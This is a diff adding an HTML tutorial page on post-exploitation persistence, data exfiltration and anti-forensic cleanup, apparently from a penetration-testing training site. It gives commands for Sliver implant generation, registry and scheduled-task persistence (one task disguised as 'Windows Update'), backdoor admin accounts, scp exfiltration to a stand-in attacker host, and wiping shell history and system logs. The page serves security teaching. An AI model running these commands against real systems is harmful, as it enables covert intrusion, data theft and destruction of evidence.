@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Persistence and Cleanup</title>
+    <link rel="stylesheet" href="main.css">
+</head>
+
+<body>
+    <!-- Dropdown Menu HTML to be added to each page -->
+    <div class="dropdown-menu-container">
+        <button class="dropdown-toggle" onclick="toggleDropdownMenu()">Menu</button>
+        <div class="dropdown-menu" id="dropdownMenu">
+            <a href="index.html">Home</a>
+            <a href="linux_basics.html">Linux Basics</a>
+            <a href="osint.html">OSINT</a>
+            <a href="social_engineering.html">Social Engineering</a>
+            <a href="nmap.html">Enumeration</a>
+            <a href="exploitation.html">Exploitation</a>
+            <a href="Webapp_Testing.html">Web Application Testing</a>
+            <a href="privilege_escalation.html">Privilege Escalation</a>
+            <a href="persistence.html">Persistence</a>
+            <a href="PasswordCracking.html">Password Cracking</a>
+            <a href="WPA2_Cracking.html">WPA2 Cracking</a>
+            <a href="additional_training.html">Additional Training</a>
+        </div>
+    </div>
+
+    <header>
+        <h1>Persistence and Cleanup</h1>
+    </header>
+
+    <div class="content">
+        <h2>Introduction to Persistence and Cleanup</h2>
+        <p>Post-exploitation techniques focus on what an attacker does after gaining access to a system. These techniques include maintaining access, exfiltrating data, and cleaning up evidence before exiting. Persistence refers to an attacker’s ability to retain access to a compromised system even after the initial vulnerability is patched or user sessions are terminated. Cleanup ensures the attacker removes traces of their presence, making detection harder. This guide will cover beginner to advanced techniques for persistence, exfiltration, and cleanup.</p>
+        
+        <h2>Maintaining Persistence</h2>
+        <p>Persistence is crucial for attackers to maintain access to a compromised system over a long period without having to re-exploit the system. Here are some common techniques to establish persistence:</p>
+        
+        <div class="video-container">
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/lMihdys4jw8?si=xQNTqBcz9X0azslh" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        </div>
+        <div>
+            <p>Video Credit: <strong>John Hammond</strong> - Persistence</p>
+        </div>
+
+
+        <h3>Setting Up Sliver</h3>
+        <p>To use Sliver for maintaining persistence, first, ensure that you have the Sliver C2 framework installed on your attacking machine. You can download it from the official GitHub repository:</p>
+        <div class="terminal">
+            <pre>git clone https://github.com/BishopFox/sliver.git</pre>
+        </div>
+        
+        <p>Navigate to the Sliver directory and build the framework:</p>
+        <div class="terminal">
+            <pre>cd sliver make</pre>
+        </div>
+        
+        <p>After building Sliver, launch the server:</p>
+        <div class="terminal">
+            <pre>./sliver-server</pre>
+        </div>
+        
+        <h3>Generating the Implant</h3>
+        <p>To maintain persistence on a target, you will need to generate an implant (payload) that will be used to establish a connection back to your C2 server. To generate an implant, use the following command in the Sliver console:</p>
+        <div class="terminal">
+            <pre>generate --mtls --platform windows --arch x64</pre>
+        </div>
+        <p>This command generates an implant for a 64-bit Windows system using mutual TLS (mTLS) for encrypted communication.</p>
+        
+        <p>Once the implant is generated, you will receive an executable file that can be transferred to the target system.</p>
+        
+        <h3>Delivering the Implant</h3>
+        <p>To deliver the implant, you can use a variety of methods, such as:</p>
+        <ul>
+            <li><strong>Phishing:</strong> Send the implant via email as an attachment, disguised as a legitimate file.</li>
+            <li><strong>Exploitation:</strong> Use an existing vulnerability on the target system to upload and execute the implant.</li>
+            <li><strong>USB Drop:</strong> Physically deliver the implant using a USB drive.</li>
+        </ul>
+        
+        <h3>Establishing Persistence</h3>
+        <p>Once the implant is executed on the target system, it will connect back to your Sliver C2 server. To maintain persistence, you can set up different persistence mechanisms, such as:</p>
+        
+        <p><strong>1. Registry Modification</strong></p>
+        <p>Add a registry key to ensure the implant runs every time the system starts:</p>
+        <div class="terminal">
+            <pre>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Sliver /t REG_SZ /d "C:\path\to\implant.exe"</pre>
+        </div>
+        <p>This command adds the implant to the startup programs, ensuring that it runs whenever the user logs in.</p>
+        
+        <p><strong>2. Scheduled Task</strong></p>
+        <p>Create a scheduled task to execute the implant at regular intervals:</p>
+        <div class="terminal">
+            <pre>schtasks /create /tn "Windows Update" /tr "C:\path\to\implant.exe" /sc minute /mo 30</pre>
+        </div>
+        <p>This command creates a scheduled task named "Windows Update" that runs the implant every 30 minutes.</p>
+        
+        <h3>Remote Command Execution</h3>
+        <p>Once persistence is established, you can use the Sliver console to interact with the compromised system and execute commands remotely:</p>
+        <div class="terminal">
+            <pre>sliver > sessions
+        sliver > use [session_id]
+        sliver ([session_id]) > shell whoami</pre>
+        </div>
+        <p>The <code>sessions</code> command lists all active sessions. Use the <code>use</code> command to interact with a specific session and run commands on the target system, such as <code>whoami</code> to verify your access.</p>
+        
+
+        <h3>Adding New User Accounts</h3>
+        <p>Creating a new user account with administrative or root privileges is an effective method for maintaining persistence on a compromised system. This allows access to the system without re-exploiting the vulnerability, ensuring control is retained even after a reboot. To create a new user on a Linux system, the <code>useradd</code> command can be used. The following command will create a new user named "attacker," add them to the <code>sudo</code> group (granting administrative rights), and set <code>/bin/bash</code> as the default shell:</p>
+        <div class="terminal">
+            <pre>sudo useradd -m -s /bin/bash -G sudo attacker</pre>
+        </div>
+        <p>After creating the account, a password must be set for the new user:</p>
+        <div class="terminal">
+            <pre>sudo passwd attacker</pre>
+        </div>
+        <p>Alternatively, direct modifications can be made to the <code>/etc/passwd</code> and <code>/etc/shadow</code> files to manually create and configure users with root privileges. This manual method can help avoid detection by obfuscating the presence of a new user.</p>
+        <p>On Windows, use PowerShell or Command Prompt to add a new user. The following commands create a user called "attacker" with the password <strong>P@ssword123</strong> and then add them to the administrators group to grant full system control:</p>
+        
+        <div class="terminal">
+            <pre>net user attacker P@ssword123 /add
+        net localgroup administrators attacker /add</pre>
+        </div>
+        <p>Users with administrative privileges can perform critical system tasks, install software, change system settings, and access sensitive files, making this an essential step for ensuring long-term control of the target system.</p>
+        
+
+        <h3>Modifying Startup Scripts</h3>
+        <p>On Linux systems, persistence can be achieved by inserting a script into system startup files, ensuring that it executes each time the system boots. The most common locations to modify are the <code>/etc/rc.local</code> file or creating a script in <code>/etc/init.d/</code>. This allows custom scripts to run automatically upon system startup. Another method is to use cron jobs for scheduling persistence commands. To modify the cron jobs, use the following command:</p>
+        <div class="terminal">
+            <pre>crontab -e @reboot /path/to/malicious/script.sh</pre>
+        </div>
+        <p>This cron job will run the specified script every time the system reboots, providing persistent access. The cron job syntax ensures the script is executed automatically, making it an effective method for ensuring a payload runs continuously without manual intervention.</p>
+        
+        <p>In Windows, persistence can be achieved by modifying the system registry to add a malicious executable to the startup folder or the <code>Run</code> registry key. By adding an entry to the <code>Run</code> key, the executable will run each time a user logs in, providing long-term persistence. The following command adds an entry to the registry to launch an executable located at <code>C:\path\to\malicious.exe</code>:</p>
+        <div class="terminal">
+            <pre>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaliciousApp /t REG_SZ /d "C:\path\to\malicious.exe"</pre>
+        </div>
+        <p>By modifying the startup process or registry keys, persistence is maintained across reboots, ensuring that the system runs predefined scripts or applications continuously, even after system reboots or user logins.</p>
+        
+
+        <h3>Leveraging Scheduled Tasks</h3>
+        <p>Scheduled tasks are an effective method for maintaining persistence, as they allow programs or scripts to run at specific intervals without user interaction. On Windows, scheduled tasks can be created to run malicious executables automatically. The following command creates a scheduled task named "UpdateTask" that runs a malicious executable located at <code>C:\path\to\malicious.exe</code> every day at 12:00 PM:</p>
+        <div class="terminal">
+            <pre>schtasks /create /tn "UpdateTask" /tr "C:\path\to\malicious.exe" /sc daily /st 12:00</pre>
+        </div>
+        <p>This task ensures that the executable is run at the specified time each day, providing a reliable method for persistence. Scheduled tasks can also be customized to run at login, system startup, or other intervals, making them highly adaptable for maintaining long-term control over the target system.</p>
+        
+
+        <h3>Backdoors and Trojans</h3>
+        <p>Backdoors and trojans are commonly used methods for maintaining persistence on compromised systems. A backdoor is a covert method of bypassing normal authentication mechanisms, allowing access to the system at any time. Trojans, on the other hand, are malicious programs disguised as legitimate software that create a backdoor into the system. Once installed, these methods enable an attacker to regain access at will without needing to exploit the system again. Tools such as <strong>Netcat</strong> and <strong>Meterpreter</strong> are often used to establish reverse shells, which allow the compromised machine to call back to the attacker's system, ensuring control even after the initial session has ended.</p>
+        <p>For example, Netcat can be used to set up a listener on the attacker's machine. The following command listens for incoming connections on port 4444, allowing for reconnection at any time:</p>
+        <div class="terminal">
+            <pre>nc -lvp 4444</pre>
+        </div>
+        <p>In this scenario, Netcat continuously listens for a connection on the specified port, allowing the compromised machine to connect back to the attacker's machine once triggered. This setup provides a reliable method for maintaining remote access without the need for re-exploitation.</p>
+        <p><strong>Meterpreter</strong>, a highly advanced payload provided by the Metasploit framework, offers even more capabilities for persistence. Once a Meterpreter session is established, it allows for a range of post-exploitation features, including uploading and downloading files, running system commands, and even enabling further backdoor mechanisms, such as creating reverse TCP shells or adding user accounts. Additionally, Meterpreter sessions can be hidden to evade detection and can persist across system reboots, providing long-term access to the compromised machine.</p>
+        <p>By using backdoors and trojans, persistence is ensured, and attackers can reconnect to the system as needed. This technique is particularly effective because it enables repeated access with minimal interaction from the compromised user, making it difficult to detect and remove.</p>
+
+        <h2>Exfiltration of Files</h2>
+<p>Once persistence is established, the next logical step in post-exploitation activities is often exfiltration, where sensitive data is stealthily transferred from the compromised system to an external location controlled by the attacker. Exfiltration can include documents, database contents, credentials, system configuration files, or proprietary information, depending on the target's resources. This process must be done quietly to avoid detection by security monitoring tools like Intrusion Detection Systems (IDS) or Data Loss Prevention (DLP) solutions. Therefore, exfiltration is typically carried out in small increments or disguised as legitimate traffic to minimize suspicion.</p>
+<p>There are several common techniques and tools used for file exfiltration. One method involves using the Secure Copy Protocol (SCP), which allows files to be securely transferred from a Linux system to a remote server. SCP uses SSH for encryption, ensuring the transfer is secure and reducing the chances of detection. An example SCP command might look like:</p>
+<div class="terminal">
+    <pre>scp /path/to/file attacker@attacker_ip:/path/to/destination</pre>
+</div>
+<p>Another technique is leveraging file transfer protocols like FTP, SFTP, or HTTP. Attackers may set up simple servers on their own machines to facilitate the transfer of files from the compromised system. For instance, Python’s built-in HTTP server can be used to serve files from the compromised machine and allow them to be downloaded remotely:</p>
+<div class="terminal">
+    <pre>python -m http.server 8080</pre>
+</div>
+<p>Attackers may also employ cloud services such as Google Drive, Dropbox, or OneDrive to exfiltrate data. This technique is particularly effective in environments where cloud storage services are used regularly, as the traffic may blend in with legitimate activity. Tools like <strong>rclone</strong> can be configured to transfer files to cloud storage accounts under the attacker's control:</p>
+<div class="terminal">
+    <pre>rclone copy /path/to/file remote:drive</pre>
+</div>
+<p>Exfiltration can also be performed by leveraging DNS tunneling, where data is encoded into DNS queries and responses, allowing files to be transferred out of a network without triggering typical monitoring systems. While DNS traffic is often not heavily scrutinized, this method requires more sophistication but can be highly effective in stealth operations.</p>
+<p>Ultimately, the exfiltration process is a delicate balance between speed and stealth, with the attacker needing to maintain persistence while avoiding detection. By using techniques such as encryption, disguising exfiltration as regular traffic, or leveraging commonly used services, attackers can successfully transfer data from the compromised system without alerting security mechanisms.</p>
+
+<h3>Using SCP (Linux)</h3>
+<p>SCP (Secure Copy Protocol) is a reliable method for securely transferring files from a compromised Linux system to a remote server controlled by the attacker. It leverages SSH (Secure Shell) for encryption, which ensures that the transferred data remains protected and unreadable by network monitoring tools. The standard SCP command allows users to specify the file to transfer, the remote user, the attacker's server IP, and the destination directory. For example:</p>
+<div class="terminal">
+    <pre>scp /path/to/file attacker@attacker_ip:/path/to/destination</pre>
+</div>
+<p>This command copies the specified file to the attacker's server, making the data readily available for later retrieval. One of the main advantages of SCP is its encryption, which masks both the file content and network credentials, making it harder to detect the transfer. Additionally, SCP is resilient and can handle large files, making it suitable for exfiltrating significant amounts of data in a relatively secure manner. Furthermore, because SSH traffic is common in many environments, SCP transfers may blend into legitimate traffic, reducing the likelihood of raising suspicion.</p>
+
+<h3>Using FTP or HTTP (Windows & Linux)</h3>
+<p>FTP (File Transfer Protocol) and HTTP (Hypertext Transfer Protocol) are other common methods attackers use to exfiltrate files from compromised systems. These protocols are straightforward to implement and widely available on both Windows and Linux environments. Attackers can easily set up an FTP or HTTP server on their system to receive files from the target machine. For instance, in Linux, using Python’s built-in HTTP server provides a simple way to serve files:</p>
+<div class="terminal">
+    <pre>python -m http.server 8080</pre>
+</div>
+<p>This command starts an HTTP server on port 8080, allowing attackers to access and download the exposed files from a web browser or using automated tools. The use of HTTP is particularly effective in environments where web traffic is less scrutinized, as HTTP communication is often considered routine. Similarly, FTP can be used for more structured file transfers, but its lack of encryption makes it easier to detect and less secure than SCP. However, FTP's simplicity makes it an attractive option for attackers looking to exfiltrate large volumes of data quickly. Tools like <code>ftp</code> clients or even browser-based downloads can be used to retrieve files from an exposed server.</p>
+
+<h3>Exfiltrating via Cloud Services</h3>
+<p>Cloud services like Dropbox, Google Drive, or OneDrive offer another stealthy method for exfiltrating data. These platforms are commonly used in many corporate environments, making traffic to and from cloud storage less likely to trigger alerts. Attackers can use tools like <strong>rclone</strong> to automate the process of uploading files from the compromised machine to a cloud account under their control. The following command uploads a file to a designated cloud storage account:</p>
+<div class="terminal">
+    <pre>rclone copy /path/to/file remote:drive</pre>
+</div>
+<p>By leveraging cloud services for exfiltration, attackers can transfer large quantities of sensitive data without raising immediate suspicion, as the traffic to cloud services is typically treated as routine. Rclone is highly configurable and can be set up to work with various cloud providers, making it a versatile tool for attackers. The ability to exfiltrate data through familiar cloud services adds a layer of obfuscation to the attack, as defenders may not immediately recognize that malicious exfiltration is taking place amidst legitimate cloud activity.</p>
+
+
+<h2>Cleaning Up After Exploitation</h2>
+<p>Once the attacker has achieved their objectives—whether it be data exfiltration, privilege escalation, or installing persistent backdoors—it is crucial to thoroughly clean up any traces of the attack to avoid detection. Proper cleanup reduces the chances of the attack being discovered during forensic investigations or routine security audits. The goal of the cleanup phase is to ensure that no evidence is left behind that could point to unauthorized activity. This process typically involves several key actions, including removing logs, clearing command history, deleting any files or tools introduced during the exploitation, and reverting any changes made to the system to mask the attack.</p>
+
+<h3>Clearing Command History</h3>
+<p>Clearing command history is one of the most basic but essential steps in cleaning up after exploitation. If an attacker’s commands are logged, they can be used as evidence during a forensic investigation, revealing the exact steps taken during the compromise. To avoid leaving this critical trace, attackers often remove or disable command history tracking on both Linux and Windows systems.</p>
+
+<p>On Linux, the command history for each user is typically stored in a hidden file called <code>.bash_history</code> located in the user’s home directory. Deleting this file effectively removes any record of commands executed in that terminal session:</p>
+<div class="terminal">
+    <pre>rm ~/.bash_history</pre>
+</div>
+<p>However, simply deleting the history may not be enough in more sophisticated environments where commands are actively monitored in real-time. To prevent future commands from being logged, attackers can disable command history logging entirely by unsetting the <code>HISTFILE</code> variable. This method ensures that no further commands executed in that session will be saved to <code>.bash_history</code>:</p>
+<div class="terminal">
+    <pre>unset HISTFILE</pre>
+</div>
+<p>Additionally, attackers may choose to set the <code>HISTSIZE</code> and <code>HISTFILESIZE</code> variables to 0, limiting the size of the command history file to prevent logging entirely:</p>
+<div class="terminal">
+    <pre>export HISTSIZE=0
+export HISTFILESIZE=0</pre>
+</div>
+<p>These actions make it much harder for forensic investigators to retrieve any evidence of commands executed during the compromise.</p>
+
+<p>On Windows, PowerShell keeps track of command history in a file stored within the user's profile directory. To clear this history, attackers can use the following PowerShell command, which removes the file where the history is saved:</p>
+<div class="terminal">
+    <pre>Remove-Item (Get-PSReadlineOption).HistorySavePath</pre>
+</div>
+<p>Clearing this file erases any record of PowerShell commands executed by the attacker. However, it's important to note that PowerShell 5.0 and newer versions log command history to the Windows event logs, so clearing the local history file alone may not be sufficient in environments where event logs are actively monitored.</p>
+
+<p>In environments with advanced security monitoring, attackers may go a step further by editing or disabling logging mechanisms themselves, including tampering with audit logs or employing tools that evade real-time monitoring. Nevertheless, clearing command history and preventing future commands from being logged is a crucial step in minimizing the risk of detection during post-exploitation cleanup.</p>
+
+
+<h3>Deleting Logs</h3>
+<p>Logs are a critical tool for defenders in detecting and investigating an attack. They contain records of events, including logins, file accesses, system changes, and errors, which can be used to trace the steps of an attacker. Therefore, deleting or tampering with these logs is a common step in post-exploitation cleanup to ensure that malicious activity goes undetected. Attackers focus on removing or modifying logs that could reveal their presence or actions on the compromised system, making it much harder for incident responders to understand the nature and extent of the breach.</p>
+
+<p>On Linux systems, log files are typically stored in the <code>/var/log/</code> directory. This directory contains a variety of logs, such as authentication logs (<code>auth.log</code>), system logs (<code>syslog</code>), and application-specific logs. To erase the evidence of malicious activity, an attacker can delete all logs by running a recursive remove command:</p>
+<div class="terminal">
+    <pre>rm -rf /var/log/*</pre>
+</div>
+<p>This command deletes all log files within the <code>/var/log/</code> directory, erasing any trace of system events, authentication attempts, and application errors. However, more cautious attackers might target specific logs, such as <code>auth.log</code> (which records login attempts) or <code>syslog</code> (which stores system events), rather than wiping the entire directory to avoid raising immediate suspicion if administrators notice that logs are missing altogether.</p>
+
+<p>In more sophisticated attacks, attackers may modify log files instead of deleting them entirely. This involves tampering with log entries to hide specific events, such as failed login attempts, privilege escalations, or file access operations. Tools like <strong>Auditd</strong> can be configured to alert defenders to log deletions, so modifying logs can be a stealthier way to cover tracks without triggering immediate alarms.</p>
+
+<p>On Windows systems, event logs play a similar role in recording key system activities, including login attempts, application crashes, and system errors. Windows stores logs in three primary categories: System, Security, and Application. Attackers can clear these logs using the built-in PowerShell command <code>wevtutil</code> to delete specific logs. For example, the following commands clear the System, Security, and Application logs, effectively erasing evidence of malicious activity:</p>
+<div class="terminal">
+    <pre>wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application</pre>
+</div>
+
+<p>Clearing event logs removes crucial information that could help defenders piece together what actions were taken during the attack. However, similar to Linux, clearing logs too aggressively can raise red flags if administrators notice that entire logs have been wiped. More subtle attackers may instead selectively delete specific log entries using specialized tools or scripts that modify logs without erasing them entirely, thus making it harder to detect the tampering.</p>
+
+<p>In environments where logs are forwarded to a centralized logging system or SIEM (Security Information and Event Management) solution, deleting logs locally may not be sufficient. Logs that have already been sent to a remote server will still be available for analysis. In such cases, attackers may attempt to disable logging services temporarily or tamper with the logging configuration to stop log forwarding, buying more time to cover their tracks before defenders notice suspicious activity.</p>
+
+<p>Ultimately, deleting or modifying logs is a key step in the cleanup process for attackers, as it prevents security teams from quickly identifying and responding to the breach. Without logs, it becomes significantly more challenging to conduct a post-incident analysis and determine how the attack unfolded.</p>
+
+<h3>Removing Persistent Entries</h3>
+<p>Removing persistent entries is a crucial step in post-exploitation cleanup to ensure that no evidence of the attacker's long-term access remains on the system. Persistence mechanisms allow attackers to maintain access even after a system reboot or user logout. Before exiting, attackers must ensure that these mechanisms are fully removed to prevent discovery by system administrators or forensic analysts.</p>
+
+<p>On Linux systems, attackers may have established persistence through cron jobs or modifications to startup scripts. Cron jobs, which automate tasks at specific intervals, are a common persistence method because they can run scripts silently in the background. To remove a malicious cron job, attackers would need to access the user’s crontab file with:</p>
+<div class="terminal">
+    <pre>crontab -e</pre>
+</div>
+<p>From here, any scheduled malicious tasks can be deleted. Additionally, if the attacker modified startup scripts, such as those in <code>/etc/rc.local</code> or <code>/etc/init.d/</code>, they must revert these changes or remove any added malicious scripts to ensure they don't run upon reboot.</p>
+
+<p>On Windows, persistence mechanisms may include creating new registry entries, adding scheduled tasks, or modifying system services. Attackers often use the <code>Run</code> registry key to automatically launch malicious programs when the system starts. To clean up, attackers need to delete any registry keys they created. For example, if a registry entry was added to launch a malicious application at startup, it can be removed with the following command:</p>
+<div class="terminal">
+    <pre>reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaliciousApp</pre>
+</div>
+
+<p>Similarly, if scheduled tasks were created to ensure persistence, they must be removed. Attackers can delete these tasks using PowerShell or the Task Scheduler:</p>
+<div class="terminal">
+    <pre>schtasks /delete /tn "MaliciousTask"</pre>
+</div>
+<p>Removing these persistent entries ensures that once the attacker leaves, no traces of their long-term presence will remain, making it more difficult for forensic analysts or security teams to trace the breach back to its origin.</p>
+
+<h2>Advanced Tools for Persistence and Cleanup</h2>
+<p>There are several advanced tools attackers can use both to maintain persistence on a compromised system and to clean up evidence of their activities. These tools provide powerful post-exploitation capabilities, allowing attackers to perform a range of tasks such as credential dumping, file transfers, and automated cleanup.</p>
+
+<ul>
+    <li><strong>Mimikatz</strong>: Mimikatz is a popular tool for credential dumping and privilege escalation on Windows systems. It allows attackers to extract plaintext passwords, hashes, and Kerberos tickets from memory, giving them further access to the network. Mimikatz also provides functionality to manipulate user privileges, enabling attackers to maintain persistence through escalated access.</li>
+    
+    <li><strong>Meterpreter</strong>: Meterpreter is an advanced post-exploitation tool included in the Metasploit framework. It provides a stealthy, in-memory payload that can run commands on a compromised machine without touching the disk, making it hard to detect. Meterpreter supports file upload and download, command execution, and even creating persistence mechanisms, such as adding new user accounts or establishing reverse shells. It also includes cleanup functionality, allowing attackers to remove traces of their activities before exiting the system.</li>
+    
+    <li><strong>Empire</strong>: Empire is a PowerShell and Python post-exploitation framework that provides full control over compromised systems. It is commonly used for maintaining persistence, executing commands, exfiltrating files, and evading detection. Empire supports both Windows and Linux systems and can be used to set up long-term persistence through scheduled tasks, registry entries, or system services. Its built-in cleanup features allow attackers to erase evidence of their activities after achieving their objectives.</li>
+</ul>
+</div>
+
+    <footer>
+        <p>Disclaimer: This tutorial is intended for educational purposes only. Unauthorized access to systems is illegal. Always obtain permission before attempting any penetration testing</p>
+    </footer>
+
+    <!-- JavaScript File -->
+    <script src="main.js"></script>
+
+
+</body>
+
+</html>
